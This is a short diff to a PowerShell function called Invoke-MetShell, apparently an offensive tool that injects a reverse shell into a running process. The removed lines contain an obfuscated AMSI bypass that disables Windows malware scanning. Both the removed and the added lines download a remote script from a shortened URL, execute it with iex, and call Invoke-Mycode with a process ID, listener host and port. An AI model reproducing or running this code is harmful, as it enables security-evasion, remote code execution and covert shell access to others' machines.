@@ -68,10 +68,8 @@ function Invoke-MetShell
     $procId = Run-Proc
     if ($env:Processor_Architecture -ne "x86")
     { 
-        write-warning 'Run x86 PowerShell'
-        #&"c:\Windows\syswow64\windowspowershell\v1.0\powershell.exe" -noni -noprofile -Execution bypass "[Ref].Assembly.GetType('System.M'+'ana'+'gement.Automation.A'+'msi'+'Uti'+'ls').""GetF`ield""('ams'+'iIni'+'tFa'+'iled','Non'+'Public,Static').SetValue(`$null,`$true);iex((New-Object system.net.webclient).DownloadString('https://goo.gl/ks6EMR'));Invoke-Mycode -ProcessId $procId -Lhost $lhost -Lport $lport;exit;"
-    	$scriptblock = "[Ref].Assembly.GetType('System.M'+'ana'+'gement.Automation.A'+'msi'+'Uti'+'ls').""GetF`ield""('ams'+'iIni'+'tFa'+'iled','Non'+'Public,Static').SetValue(`$null,`$true);iex((New-Object system.net.webclient).DownloadString('https://goo.gl/ks6EMR'));Invoke-Mycode -ProcessId $procId -Lhost $lhost -Lport $lport;"
-        start-job -scriptblock $scriptblock -RunAs32
+        write-warning 'Run command in x86 context'
+        start-job -scriptblock {iex((New-Object system.net.webclient).DownloadString('https://goo.gl/ks6EMR'));Invoke-Mycode -ProcessId $args[0] -Lhost $args[1] -Lport $args[2];} -ArgumentList @($procId, $lhost, $lport) -RunAs32
     }
     else
     { 
